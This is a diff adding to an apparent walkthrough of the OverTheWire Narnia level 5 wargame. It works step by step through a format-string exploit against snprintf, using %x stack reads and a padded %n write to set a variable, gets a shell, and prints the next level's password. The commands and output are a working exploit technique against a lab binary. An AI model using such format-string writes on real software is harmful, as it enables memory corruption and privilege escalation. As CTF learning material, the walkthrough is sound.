@@ -286,6 +286,8 @@ Breakpoint 2, 0x080484ee in main ()
 nope....
 
 ======================= NEW technique ============================================
+As it turns out, there is no buffer overflow here. The reason I failed to see for the A's being seen close to i is because of the call to snprintf(), that's a different stack frame.
+
 We are going to try to exploit snprintf() since the 3rd parameter is argv[1] we can play with format strings
 Using the different % parameters we can either read formatted stack mem or write to it if parameters are not specified to print function.
 For instance:
@@ -368,3 +370,54 @@ Another noteworthy point is that, as we can see in the outputted buffer, A's are
 Once as the string being outputted and another as it is on the stack as a bunch of 0x41. 
 
 This means that we can push an address on the stack and then access it. Let's play around with this.
+
+===============================================================================
+
+I added a "." in between each %x to make it more humanly parseable:
+
+narnia5@narnia:~$ /narnia/narnia5 $(python -c'print "\xec\xd6\xff\xff"+"%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"')
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [����f7eb8fe6.ffffffff.ffffd6ee.f7e2fc34.ffffd6ec.62653766.36656] (63)
+i = 1 (0xffffd70c)
+narnia5@narnia:~$ /narnia/narnia5 $(python -c'print "\x0c\xd7\xff\xff"+"%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"')
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [
+          ���f7eb8fe6.ffffffff.ffffd6ee.f7e2fc34.ffffd70c.62653766.36656] (63)
+i = 1 (0xffffd70c)
+
+As we can see in the second call of narnia5, we added the value of &i (0xffffd70c) at the begining of the input and it's now indexed at the 5th %x
+Now let's use %n at that index:
+narnia5@narnia:~$ /narnia/narnia5 $(python -c'print "\x0c\xd7\xff\xff"+"%x.%x.%x.%x.%n.%x.%x.%x.%x.%x.%x.%x"')
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [
+          ���f7eb8fe6.ffffffff.ffffd6ee.f7e2fc34..62653766.36656638.6666] (63)
+i = 40 (0xffffd70c)
+
+Check it out!! i=40! we're getting somewhere. 
+It's worth noting the definitions of format strings provided above, %n writes the number of bytes printed so far.
+
+Let's try to add 500 bytes to the %x just before:
+narnia5@narnia:~$ /narnia/narnia5 $(python -c'print "\x0c\xd7\xff\xff"+"%x.%x.%x.%500x.%n.%x.%x.%x.%x.%x.%x.%x"')
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [
+          ���f7eb8fe6.ffffffff.ffffd6de.                                ] (63)
+i = 1 (0xffffd6fc)
+Segmentation fault (core dumped)
+
+ok that broke because adding 500 bytes to the stack changed the address of i, so let's fix that.
+
+narnia5@narnia:~$ /narnia/narnia5 $(python -c'print "\xfc\xd6\xff\xff"+"%x.%x.%x.%500x.%n.%x.%x.%x.%x.%x.%x.%x"')
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [����f7eb8fe6.ffffffff.ffffd6de.                                ] (63)
+i = 532 (0xffffd6fc)
+
+532 accounts for the other bytes printed before the witdh parameter of 500 was applied, so let's adjust that to 500-32=468
+
+narnia5@narnia:~$ /narnia/narnia5 $(python -c'print "\xfc\xd6\xff\xff"+"%x.%x.%x.%468x.%n.%x.%x.%x.%x.%x.%x.%x"')
+Change i's value from 1 -> 500. GOOD
+$ whoami
+narnia6
+$ cat /etc/narnia_pass/narnia6
+neezocaeng
+
+Boom shakalaka!
